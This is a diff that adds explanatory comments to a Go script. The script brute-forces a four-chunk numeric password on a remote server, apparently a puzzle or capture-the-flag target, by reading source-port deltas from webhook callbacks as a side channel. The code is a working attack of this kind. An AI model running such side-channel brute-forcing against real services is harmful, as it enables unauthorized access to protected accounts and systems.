@@ -11,11 +11,14 @@ import (
 	"time"
 )
 
-// JSON Response from the server.
+// JSON Response from the server. Note the funky declaration, we use it to bypass some problems with lack of capital leter in
+// the responce. (We need the variable to be exported (Capitalized)).
 type Message struct {
 	Success bool `json:"success"`
 }
 
+// Make a POST request to the server.
+// Returns parsed responce from the server. True if the password is correct, otherwise false.
 func makeRequest(n [4]int, hook_addr string, remote_addr string) bool {
 	// Make the request body.
 	req_body := fmt.Sprintf("{\"password\": \"%03d%03d%03d%03d\", \"webhooks\": [\"%s\"]}", n[0], n[1], n[2], n[3], hook_addr)
@@ -48,8 +51,8 @@ func makeRequest(n [4]int, hook_addr string, remote_addr string) bool {
 			return false
 		}
 
-		// WIN == true.
 		if win.Success {
+			// Server responded that the password is correct, wooho.
 			return true
 		}
 	} else {
@@ -60,6 +63,7 @@ func makeRequest(n [4]int, hook_addr string, remote_addr string) bool {
 }
 
 func main() {
+	// Current time, used to calculate running time.
 	start := time.Now()
 
 	// Make a channel.
@@ -67,7 +71,6 @@ func main() {
 
 	// Setup webhook handler.
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		// fmt.Print("Handle called!\n")
 		cs <- r.RemoteAddr
 	})
 
@@ -107,6 +110,7 @@ func main() {
 			n[c] = i
 			bingo = makeRequest(n, addr, remote_addr)
 			if bingo == true {
+				// We have the correct password.
 				break
 			}
 			// Get the response from the webhook.
@@ -114,6 +118,15 @@ func main() {
 			delta := (port - old_port)
 
 			// Okey, we have something interesting here.
+			// The algorytm is quite simple. If the chunk 0 is wrong, the incoming port
+			// delta will be 0+2 or larger. If delta is larger than 0+2 and never is equal to
+			// 2, then we have the correct number for the chunk. We're retesting this 'retests'
+			// number of times and if we get 0+2, it's a false positive. In theory 2 retests
+			// should be enough, but we're using 3 just to be safe.
+			// Same thing applies for chunk 1 and 2, except instead of 0+2 you have 1+2 and 2+2,
+			// because that's the pattern you get from the server. Chunk 3 is an exception since
+			// we can easily check if it's right in one try by just checking the JSON responce.
+			// That's why we don't do retests on chunk 3.
 			if delta != c+2 && c != 3 {
 				j := 0
 				for j = 0; j < retests; j++ {
@@ -129,11 +142,12 @@ func main() {
 					}
 				}
 				if j == retests {
-					// We have it.
+					// All retests passed, we have the correct number.
 					fmt.Printf(" %03d", i)
 					break
 				}
 			} else {
+				// This is chunk 3, or delta was c+2 which means that the number is not correct.
 				old_port = port
 			}
 		}
@@ -142,7 +156,7 @@ func main() {
 	// Print the last chunk.
 	fmt.Printf(" %03d", n[3])
 
-	// EPeen.
+	// EPeen (Running time).
 	dt := time.Since(start).Minutes()
 	fmt.Printf("\nTime elapsed: %.2f mins.\n", dt)
 
